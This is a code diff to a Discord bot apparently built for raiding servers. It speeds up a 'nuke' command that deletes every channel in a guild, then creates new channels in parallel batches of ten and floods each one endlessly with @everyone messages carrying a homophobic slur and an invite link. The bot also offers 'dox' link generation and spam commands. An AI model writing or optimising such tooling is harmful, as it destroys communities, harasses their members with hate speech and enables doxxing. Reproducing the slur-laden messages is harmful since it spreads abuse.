@@ -19,6 +19,7 @@ const links = new Map();
 const startTime = Date.now();
 let nukeRunning = false;
 let nukeGuildId = null;
+let activeChannels = [];
 
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
@@ -38,7 +39,7 @@ async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: 'Infinite nuke – creates channels & spams forever' },
+        { name: 'nuke', description: 'Ultra-fast infinite nuke' },
         { name: 'stop', description: 'Stop the nuke' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
@@ -91,6 +92,7 @@ client.on('interactionCreate', async (interaction) => {
             }
             nukeRunning = false;
             nukeGuildId = null;
+            activeChannels = [];
             await interaction.editReply('⏹️ **Nuke stopped.**');
             return;
         }
@@ -127,7 +129,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE (Infinite – no delay, always creating) ----
+        // ---- NUKE (Ultra-fast) ----
         if (commandName === 'nuke') {
             if (nukeRunning) {
                 return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
@@ -138,38 +140,54 @@ client.on('interactionCreate', async (interaction) => {
 
             nukeRunning = true;
             nukeGuildId = guild.id;
+            activeChannels = [];
 
-            await interaction.editReply('🚀 **Infinite nuke started!** Use `/stop` to stop it.');
+            await interaction.editReply('🚀 **Ultra-fast nuke started!** Use `/stop` to stop it.');
 
             // Delete all existing channels
             await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
 
-            // Variables for infinite loop
-            let channelIndex = 0;
             const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
-            // Keep running until /stop
+            // Build the spam message once
+            const line = variants[0];
+            let big = `@everyone ${line}\n`;
+            while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
+            big += `\n${inviteLine}`;
+            const spamMessage = big.slice(0, 2000);
+
+            // ---- PARALLEL: Create channels AND spam them ----
+            let channelIndex = 0;
             while (nukeRunning && nukeGuildId === guild.id) {
-                // Create a new channel
-                const newChannel = await guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null);
-                if (!newChannel) continue;
-
-                // Build the spam message (nearly 2000 chars)
-                const line = variants[channelIndex % variants.length];
-                let big = `@everyone ${line}\n`;
-                while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
-                big += `\n${inviteLine}`;
-                const msg = big.slice(0, 2000);
-
-                // Send the message to the new channel immediately (no delay)
-                await newChannel.send(msg).catch(() => {});
-
+                // Create a batch of channels (10 at a time)
+                const batchSize = 10;
+                const createPromises = [];
+                for (let i = 0; i < batchSize; i++) {
+                    if (!nukeRunning) break;
+                    createPromises.push(
+                        guild.channels.create({ name: 'pulse', type: ChannelType.GuildText })
+                            .then(c => {
+                                if (c) {
+                                    activeChannels.push(c);
+                                    // Immediately send the spam message to this channel (no delay)
+                                    c.send(spamMessage).catch(() => {});
+                                    // Also keep spamming it in a loop
+                                    spamChannelContinuously(c);
+                                }
+                                return c;
+                            })
+                            .catch(() => null)
+                    );
+                }
+                // Wait for all channels in this batch to be created
+                await Promise.all(createPromises);
                 channelIndex++;
             }
 
             // Cleanup
             nukeRunning = false;
+            activeChannels = [];
             return;
         }
 
@@ -316,6 +334,24 @@ client.on('interactionCreate', async (interaction) => {
         try { await interaction.editReply(`❌ Error: ${error.message}`); } catch {}
     }
 });
+
+// ---- CONTINUOUS SPAMMING FUNCTION ----
+async function spamChannelContinuously(channel) {
+    const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
+    const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
+    let index = 0;
+
+    while (nukeRunning && activeChannels.includes(channel)) {
+        const line = variants[index % variants.length];
+        let big = `@everyone ${line}\n`;
+        while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
+        big += `\n${inviteLine}`;
+        const msg = big.slice(0, 2000);
+
+        await channel.send(msg).catch(() => {});
+        index++;
+    }
+}
 
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
